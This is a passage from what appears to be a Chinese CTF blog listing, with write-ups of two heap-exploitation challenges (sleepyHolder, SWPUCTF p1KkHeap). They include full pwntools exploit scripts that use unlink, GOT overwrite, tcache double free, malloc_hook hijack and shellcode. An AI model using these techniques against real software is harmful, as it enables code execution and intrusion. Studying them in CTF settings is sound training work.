<h5 id="然后算出偏移，算出system函数的地址，再edit堆0，0x6020c0"><a href="#然后算出偏移，算出system函数的地址，再edit堆0，0x6020c0" class="headerlink" title="然后算出偏移，算出system函数的地址，再edit堆0，0x6020c0"></a>然后算出偏移，算出system函数的地址，再edit堆0，0x6020c0</h5><pre><code class="lang-py">payload=p64(elf.got[&#39;atoi&#39;])+p64(0)+p32(1)+p32(1)+p32(1)
edit(1,payload)
</code></pre>
<p><img src="https://i0.imgs.ovh/2023/10/31/AKQhe.png" alt="image-20231031180043302"></p>
<h5 id="再edit堆2，写上system的地址，"><a href="#再edit堆2，写上system的地址，" class="headerlink" title="再edit堆2，写上system的地址，"></a>再edit堆2，写上system的地址，</h5><pre><code class="lang-py">edit(2,p64(system))
</code></pre>
<p><img src="https://i0.imgs.ovh/2023/10/31/AKRU3.png" alt="image-20231031180248465"></p>
<h5 id="主函数菜单那里还有个atoi函数，写上’sh’即可"><a href="#主函数菜单那里还有个atoi函数，写上’sh’即可" class="headerlink" title="主函数菜单那里还有个atoi函数，写上’sh’即可"></a>主函数菜单那里还有个atoi函数，写上’sh’即可</h5><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*
from LibcSearcher import *
#p=remote(&quot;node4.buuoj.cn&quot;,)
p=process(&quot;./sleepyHolder_hitcon_2016&quot;)
context.log_level=&quot;debug&quot;
context(arch=&#39;amd64&#39;)
elf=ELF(&#39;./sleepyHolder_hitcon_2016&#39;)
libc=ELF(&#39;libc-2.23.so&#39;)
def add(chose,content):
    p.sendlineafter(&#39;3. Renew secret\n&#39;,&#39;1&#39;)
    p.sendlineafter(&#39;What secret do you want to keep?&#39;,str(chose))
    p.sendafter(&#39;Tell me your secret: &#39;,content)

def dele(index):
    p.sendlineafter(&#39;3. Renew secret\n&#39;,&#39;2&#39;)
    p.sendlineafter(&#39;Which Secret do you want to wipe?&#39;,str(index))

def edit(ch,content):
    p.sendlineafter(&#39;3. Renew secret\n&#39;,&#39;3&#39;)
    p.sendlineafter(&#39;Which Secret do you want to renew?&#39;,str(ch))
    p.sendafter(&#39;Tell me your secret: &#39;,content)

add(1,&#39;AAAA&#39;) 
add(2,&#39;BBBB&#39;) 

dele(1)
add(3,&#39;cccc&#39;) 

dele(1)
add(1,&#39;aaaa&#39;) 

fd=0x6020d0-0x18
bk=0x6020d0-0x10

payload=p64(0)+p64(0x21)+p64(fd)+p64(bk)+p64(0x20)
edit(1,payload) #6

dele(2) #7 unlink


payload=p64(0)+p64(elf.got[&#39;free&#39;])+p64(0)+p64(0x6020c0)+p32(1)+p32(1)+p32(1)
edit(1,payload)  #8


edit(2,p64(0x400760))
edit(1,p64(0x602020))

dele(2)

#dele(2)
p.recvuntil(&#39;2. Big secret&#39;)
puts_addr=u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;))
print(hex(puts_addr))
base=puts_addr-libc.sym[&#39;puts&#39;]

system=base+libc.sym[&#39;system&#39;]

payload=p64(elf.got[&#39;atoi&#39;])+p64(0)+p32(1)+p32(1)+p32(1)
edit(1,payload)


edit(2,p64(system))


p.sendlineafter(&#39;3. Renew secret\n&#39;,&#39;sh\n&#39;)

p.interactive()
</code></pre>

        


        <span>
          <a class="article-read" href="/2023/10/30/sleepyHolder-hitcon-2016/"> Read more -->
          </span>
        </div>

        
    
    <div class="recent-post-item">

      <a href="/2023/10/29/SWPUCTF-2019-p1KkHeap/" class="item-title">SWPUCTF_2019_p1KkHeap</a>
      
      <time datetime="2023-10-29T09:53:51.000Z">
        2023-10-29
      </time>
      
      <!-- <div class="article-digest"> -->
        <!-- 所有操作总共限制在了0x12次
保护全开，限制了堆的大小在0x100，不能绕过tachebin机制
dele时没有将bss段上的堆指针清零，存在double free漏洞
最多只能申请8次堆
本想泄露堆的地址然后改size泄露地址，但是最后的dele会报错，不知道什么原因，而且申请的次数根本不够用，所以这个方法不行。add(0x40) #0
add(0x40) #1
add(0x10) #2
add(0x10) #3
dele(0)
dele(1)
dele(0)
show(0)
p.recvuntil(&#39;content: &#39;)
m0_addr=u64(p.recv(6).ljust(8,&#39;\x00&#39;))
print(hex(m0_addr))
#add(0x10,)
add(0x40)
edit(4,p64(m0_addr+0x50))
add(0x40)
add(0x40)
add(0x40)
payload=p64(0)*3+p64(0x421)
edit(7,payload)


这里libc2.27有一种特性，tcache_perthread_ -->
        <!-- </div> -->

        
        <h5 id="所有操作总共限制在了0x12次"><a href="#所有操作总共限制在了0x12次" class="headerlink" title="所有操作总共限制在了0x12次"></a>所有操作总共限制在了0x12次</h5><p><img src="https://i0.imgs.ovh/2023/10/29/AV5dU.png" alt="image-20231029175834785"></p>
<h5 id="保护全开，限制了堆的大小在0x100，不能绕过tachebin机制"><a href="#保护全开，限制了堆的大小在0x100，不能绕过tachebin机制" class="headerlink" title="保护全开，限制了堆的大小在0x100，不能绕过tachebin机制"></a>保护全开，限制了堆的大小在0x100，不能绕过tachebin机制</h5><p><img src="https://i0.imgs.ovh/2023/10/29/AVjMs.png" alt="image-20231029175545040"></p>
<h5 id="dele时没有将bss段上的堆指针清零，存在double-free漏洞"><a href="#dele时没有将bss段上的堆指针清零，存在double-free漏洞" class="headerlink" title="dele时没有将bss段上的堆指针清零，存在double free漏洞"></a>dele时没有将bss段上的堆指针清零，存在double free漏洞</h5><p><img src="https://i0.imgs.ovh/2023/10/29/AV4uX.png" alt="image-20231029175653199"></p>
<h5 id="最多只能申请8次堆"><a href="#最多只能申请8次堆" class="headerlink" title="最多只能申请8次堆"></a>最多只能申请8次堆</h5><p><img src="https://i0.imgs.ovh/2023/10/29/AVdF0.png" alt="image-20231029175951307"></p>
<h5 id="本想泄露堆的地址然后改size泄露地址，但是最后的dele会报错，不知道什么原因，而且申请的次数根本不够用，所以这个方法不行。"><a href="#本想泄露堆的地址然后改size泄露地址，但是最后的dele会报错，不知道什么原因，而且申请的次数根本不够用，所以这个方法不行。" class="headerlink" title="本想泄露堆的地址然后改size泄露地址，但是最后的dele会报错，不知道什么原因，而且申请的次数根本不够用，所以这个方法不行。"></a>本想泄露堆的地址然后改size泄露地址，但是最后的dele会报错，不知道什么原因，而且申请的次数根本不够用，所以这个方法不行。</h5><pre><code class="lang-py">add(0x40) #0
add(0x40) #1
add(0x10) #2
add(0x10) #3
dele(0)
dele(1)
dele(0)
show(0)
p.recvuntil(&#39;content: &#39;)
m0_addr=u64(p.recv(6).ljust(8,&#39;\x00&#39;))
print(hex(m0_addr))
#add(0x10,)
add(0x40)
edit(4,p64(m0_addr+0x50))
add(0x40)
add(0x40)
add(0x40)
payload=p64(0)*3+p64(0x421)
edit(7,payload)
</code></pre>
<p><img src="https://i0.imgs.ovh/2023/10/29/AVy8l.png" alt="image-20231029190203419"></p>
<h5 id="这里libc2-27有一种特性，tcache-perthread-struct结构体在堆上，释放后大小在0x20到0x410的堆的地址会放在开始的0x250的堆那里，这里释放了三个堆，从0x557386b4a010开始，他是小端序存储放到了后边，第一个字节是0x10大小的堆的数量，然后依次是0x20-最多放7个，放完就放fastbin和unsortedbin里。"><a href="#这里libc2-27有一种特性，tcache-perthread-struct结构体在堆上，释放后大小在0x20到0x410的堆的地址会放在开始的0x250的堆那里，这里释放了三个堆，从0x557386b4a010开始，他是小端序存储放到了后边，第一个字节是0x10大小的堆的数量，然后依次是0x20-最多放7个，放完就放fastbin和unsortedbin里。" class="headerlink" title="这里libc2.27有一种特性，tcache_perthread_struct结构体在堆上，释放后大小在0x20到0x410的堆的地址会放在开始的0x250的堆那里，这里释放了三个堆，从0x557386b4a010开始，他是小端序存储放到了后边，第一个字节是0x10大小的堆的数量，然后依次是0x20,最多放7个，放完就放fastbin和unsortedbin里。"></a>这里libc2.27有一种特性，tcache_perthread_struct结构体在堆上，释放后大小在0x20到0x410的堆的地址会放在开始的0x250的堆那里，这里释放了三个堆，从0x557386b4a010开始，他是小端序存储放到了后边，第一个字节是0x10大小的堆的数量，然后依次是0x20,最多放7个，放完就放fastbin和unsortedbin里。</h5><p><img src="https://i0.imgs.ovh/2023/10/29/ALhDX.png" alt="image-20231029203053580"></p>
<h5 id="在主函数里有一个函数"><a href="#在主函数里有一个函数" class="headerlink" title="在主函数里有一个函数"></a>在主函数里有一个函数</h5><p><img src="https://i0.imgs.ovh/2023/10/29/ALSVt.png" alt="image-20231029205210736"></p>
<h5 id="它映射了一个地址在0x6666000，那么这道题很明显用shellcode写，把shellcode写在这个地址然后执行"><a href="#它映射了一个地址在0x6666000，那么这道题很明显用shellcode写，把shellcode写在这个地址然后执行" class="headerlink" title="它映射了一个地址在0x6666000，那么这道题很明显用shellcode写，把shellcode写在这个地址然后执行"></a>它映射了一个地址在0x6666000，那么这道题很明显用shellcode写，把shellcode写在这个地址然后执行</h5><p><img src="https://i0.imgs.ovh/2023/10/29/ALukm.png" alt="image-20231029205237233"></p>
<h5 id="首先先计算出tcache-perthread-struct结构体的地址，这里可以直接对一个堆释放两次"><a href="#首先先计算出tcache-perthread-struct结构体的地址，这里可以直接对一个堆释放两次" class="headerlink" title="首先先计算出tcache_perthread_struct结构体的地址，这里可以直接对一个堆释放两次"></a>首先先计算出tcache_perthread_struct结构体的地址，这里可以直接对一个堆释放两次</h5><pre><code class="lang-py">add(0x100)
add(0x100)
dele(1)
dele(1)
show(1)
p.recvuntil(&#39;content: &#39;)
tache_addr=u64(p.recv(6).ljust(8,&#39;\x00&#39;))-0x360
print(hex(tache_addr))
</code></pre>
<h5 id="再申请堆就能直接修改堆指针-改到tache-perthread-struct开始的地址"><a href="#再申请堆就能直接修改堆指针-改到tache-perthread-struct开始的地址" class="headerlink" title="再申请堆就能直接修改堆指针,改到tache_perthread_struct开始的地址"></a>再申请堆就能直接修改堆指针,改到tache_perthread_struct开始的地址</h5><pre><code class="lang-py">add(0x100)  #2
edit(2,p64(tache_addr))
</code></pre>
<p><img src="https://i0.imgs.ovh/2023/10/29/ALONR.png" alt="image-20231029210730885"></p>
<h5 id="再申请两次，在tache-perthread能改到下面的地址-相对开始的偏移是0xc8-这里不太清楚为什么改到下面的bin指针，应该和堆管理器有关"><a href="#再申请两次，在tache-perthread能改到下面的地址-相对开始的偏移是0xc8-这里不太清楚为什么改到下面的bin指针，应该和堆管理器有关" class="headerlink" title="再申请两次，在tache_perthread能改到下面的地址,相对开始的偏移是0xc8,这里不太清楚为什么改到下面的bin指针，应该和堆管理器有关"></a>再申请两次，在tache_perthread能改到下面的地址,相对开始的偏移是0xc8,这里不太清楚为什么改到下面的bin指针，应该和堆管理器有关</h5><pre><code class="lang-py">add(0x100)  #3
add(0x100)  #4
vmmap=0x66660000
edit(4,0xb8*&#39;\x00&#39;+p64(vmmap))
</code></pre>
<p><img src="https://i0.imgs.ovh/2023/10/29/AL1xd.png" alt="image-20231029213256159"></p>
<h5 id="再申请堆，在0x66660000这个地址上写上shellcode，这里看到shellcode的大小是大于0x30的，至于为什么地址是0x66660300-其实后面改成shellcode以后的地址都可以，比如0x66660040以后"><a href="#再申请堆，在0x66660000这个地址上写上shellcode，这里看到shellcode的大小是大于0x30的，至于为什么地址是0x66660300-其实后面改成shellcode以后的地址都可以，比如0x66660040以后" class="headerlink" title="再申请堆，在0x66660000这个地址上写上shellcode，这里看到shellcode的大小是大于0x30的，至于为什么地址是0x66660300,其实后面改成shellcode以后的地址都可以，比如0x66660040以后"></a>再申请堆，在0x66660000这个地址上写上shellcode，这里看到shellcode的大小是大于0x30的，至于为什么地址是0x66660300,其实后面改成shellcode以后的地址都可以，比如0x66660040以后</h5><pre><code class="lang-py">add(0x100)  #5
shellcode=shellcraft.open(&#39;flag&#39;,0)
shellcode+=shellcraft.read(3,0x66660300,0x30)
shellcode+=shellcraft.write(1,0x66660300,0x30)
edit(5,shellcode)
</code></pre>
<p><img src="https://i0.imgs.ovh/2023/10/29/ALEZe.png" alt="image-20231029214310944"></p>
<h5 id="当tache-perthread的size为0但所对应的首地址不为空时，再分配出去size会变成0xff大于7，再dele-0-会放在unsortedbin，因为大于0x80，此时可以泄露main-arena-96的地址，这个地址减0x70就是malloc-hook的地址"><a href="#当tache-perthread的size为0但所对应的首地址不为空时，再分配出去size会变成0xff大于7，再dele-0-会放在unsortedbin，因为大于0x80，此时可以泄露main-arena-96的地址，这个地址减0x70就是malloc-hook的地址" class="headerlink" title="当tache_perthread的size为0但所对应的首地址不为空时，再分配出去size会变成0xff大于7，再dele(0)会放在unsortedbin，因为大于0x80，此时可以泄露main_arena+96的地址，这个地址减0x70就是malloc_hook的地址"></a>当tache_perthread的size为0但所对应的首地址不为空时，再分配出去size会变成0xff大于7，再dele(0)会放在unsortedbin，因为大于0x80，此时可以泄露main_arena+96的地址，这个地址减0x70就是malloc_hook的地址</h5><pre><code class="lang-py">dele(0)
show(0)
p.recvuntil(&#39;content: &#39;)
malloc_hook=u64(p.recv(6).ljust(8,&#39;\x00&#39;))-0x70
print(hex(malloc_hook))
</code></pre>
<p><img src="https://i0.imgs.ovh/2023/10/29/AXnaN.png" alt="image-20231029221645764"></p>
<h5 id="再以相同的方式改掉tachebin的地址"><a href="#再以相同的方式改掉tachebin的地址" class="headerlink" title="再以相同的方式改掉tachebin的地址"></a>再以相同的方式改掉tachebin的地址</h5><pre><code class="lang-py">edit(4,0xb8*&#39;\x00&#39;+p64(malloc_hook))
</code></pre>
<p><img src="https://i0.imgs.ovh/2023/10/29/AXrKU.png" alt="image-20231029221302095"></p>
<h5 id="再申请一次0x100大小的堆，edit内容为0x66660000的地址，再申请一次堆即可提权"><a href="#再申请一次0x100大小的堆，edit内容为0x66660000的地址，再申请一次堆即可提权" class="headerlink" title="再申请一次0x100大小的堆，edit内容为0x66660000的地址，再申请一次堆即可提权"></a>再申请一次0x100大小的堆，edit内容为0x66660000的地址，再申请一次堆即可提权</h5><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*
from LibcSearcher import *
#p=remote(&quot;node4.buuoj.cn&quot;,)
p=process(&quot;./SWPUCTF_2019_p1KkHeap&quot;)
context.update(arch=&#39;amd64&#39;, os=&#39;linux&#39;, endian=&#39;little&#39;)
context.log_level=&quot;debug&quot;
libc=ELF(&#39;./libc-2.27.so&#39;)
def add(size):
    p.sendlineafter(&#39;Your Choice: &#39;,&#39;1&#39;)
    p.sendlineafter(&#39;size: &#39;,str(size))

def show(index):
    p.sendlineafter(&#39;Your Choice: &#39;,&#39;2&#39;)
    p.sendlineafter(&#39;id: &#39;,str(index))

def edit(index,content):
    p.sendlineafter(&#39;Your Choice: &#39;,&#39;3&#39;)
    p.sendlineafter(&#39;id: &#39;,str(index))
    p.sendlineafter(&#39;content: &#39;,content)

def dele(index):
    p.sendlineafter(&#39;Your Choice: &#39;,&#39;4&#39;)
    p.sendlineafter(&#39;id: &#39;,str(index))

add(0x100)  #0
add(0x100)  #1
dele(1)
dele(1)
show(1)
p.recvuntil(&#39;content: &#39;)
tache_addr=u64(p.recv(6).ljust(8,&#39;\x00&#39;))-0x360
print(hex(tache_addr))
add(0x100)  #2
edit(2,p64(tache_addr)*2)

add(0x100)  #3
add(0x100)  #4
vmmap=0x66660000
edit(4,0xb8*&#39;\x00&#39;+p64(vmmap))
add(0x100)  #5
shellcode=shellcraft.open(&#39;flag&#39;,0)
shellcode+=shellcraft.read(3,0x66660300,0x30)
shellcode+=shellcraft.write(1,0x66660300,0x30)
edit(5,asm(shellcode))

dele(0)
show(0)
p.recvuntil(&#39;content: &#39;)
malloc_hook=u64(p.recv(6).ljust(8,&#39;\x00&#39;))-0x70
print(hex(malloc_hook))
#dele(0)

edit(4,0xb8*&#39;\x00&#39;+p64(malloc_hook))

add(0x100)  #6
edit(6,p64(vmmap))

add(0x100)
gdb.attach(p)
sleep(1)

p.interactive()
</code></pre>

        


        <span>
          <a class="article-read" href="/2023/10/29/SWPUCTF-2019-p1KkHeap/"> Read more -->
          </span>
        </div>

        
      </div>
      


      <div id="recent-posts-paginator">
        <a class="extend prev" rel="prev" href="/page/9/"> </a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="page-number" href="/page/9/">9</a><span class="page-number current">10</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/11/"> </a>
      </div>

    </div>

<aside id="sidebar">
  
  <div class="widget-box">
  	  <div class="widget-box">
    <h3 class="widget-title-friends">friends</h3>
    <div class="widget">
      
        <a class="friends-list-link" style="display: block;" href="https://fireworks99.github.io/" title target='_blank'
        >fireworks99</a>
      
    </div>
  </div>

  </div>
  
  <div class="widget-box">
  	

  </div>
  
  <div class="widget-box">
  	
  <div class="widget-box">
    <h3 class="widget-title-tag">tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/buu/" rel="tag">buu</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-NewSar/" rel="tag">ctf-NewSar</a></li></ul>
    </div>
  </div>


  </div>
  
  <div class="widget-box">
  	
  <div class="widget-box">
    <h3 class="widget-title-archive">archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">November 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/10/">October 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/09/">September 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/07/">July 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/05/">May 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/04/">April 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">March 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/02/">February 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/10/">October 2023</a></li></ul>
    </div>
  </div>

  </div>
  
  <div class="widget-box">
  	
  <div class="widget-box">
    <h3 class="widget-title-post">recent_posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a class="recent_posts-list-link" href="/2024/11/26/FUZZ/xpdf/">xpdf</a>
          </li>
        
          <li>
            <a class="recent_posts-list-link" href="/2024/11/20/trick/">trick</a>
          </li>
        
          <li>
            <a class="recent_posts-list-link" href="/2024/11/20/trick/trick/">trick</a>
          </li>
        
          <li>
            <a class="recent_posts-list-link" href="/2024/11/18/qwnt2024/">qwnt2024</a>
          </li>
        
          <li>
            <a class="recent_posts-list-link" href="/2024/11/13/%E6%B2%99%E7%AE%B1/%E6%B2%99%E7%AE%B1/">沙箱</a>
          </li>
        
      </ul>
    </div>
  </div>

  </div>
  
</aside>

<!-- <div id="paginator"> -->
<!--   <a class="extend prev" rel="prev" href="/page/9/"> </a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="page-number" href="/page/9/">9</a><span class="page-number current">10</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/11/"> </a> -->
<!-- </div> -->

    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
          tex2jax: {
            inlineMath: [ ['$','$'], ["\\(","\\)"] ],
            processEscapes: true
          }
        });
      </script>

    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
            tex2jax: {
              skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
            }
          });
      </script>

    <script type="text/x-mathjax-config">
      MathJax.Hub.Queue(function() {
              var all = MathJax.Hub.getAllJax(), i;
              for(i=0; i < all.length; i += 1) {
                  all[i].SourceElement().parentNode.className += ' has-jax';
              }
          });
    </script>

    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>



			</div>
		</div>

		<div id="bottom-outer">
			<div id="bottom-inner">
				Site by your name | 
				Powered by <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a> |
				theme <a target="_blank" rel="noopener" href="https://github.com/fireworks99/hexo-theme-PreciousJoy">PreciousJoy</a>
			</div>
		</div>

		
	</div>





	
	<!-- scripts list from theme config.yml -->
	
	<script src="/js/jquery-3.5.1.min.js"></script>
	
	<script src="/js/PreciousJoy.js"></script>
	
	<script src="/js/highlight.pack.js"></script>
	
	<script src="/js/jquery.fancybox.min.js"></script>
	
	<script src="/js/search.js"></script>
	
	<script src="/js/load.js"></script>
	
	<script src="/js/jquery.mCustomScrollbar.concat.min.js"></script>
	
	<script src="/js/clipboard.min.js"></script>
	
	

	<script>hljs.initHighlightingOnLoad();</script>

</body>
</html>
